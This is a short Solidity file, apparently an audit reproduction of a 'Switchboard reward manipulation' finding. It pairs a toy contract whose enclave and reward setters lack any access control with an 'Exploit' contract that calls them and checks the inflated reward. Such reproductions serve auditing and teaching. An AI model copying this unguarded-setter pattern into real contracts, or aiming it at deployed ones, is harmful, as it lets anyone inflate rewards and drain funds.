// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 47980: Switchboard reward manipulation. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public rewards; bool public enclaveUpdated; function updateEnclave() external { enclaveUpdated = true; } function addReward(uint256 amount) external { rewards += amount; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.updateEnclave(); bug.addReward(1000); success = bug.rewards() == 1000;
    }
}


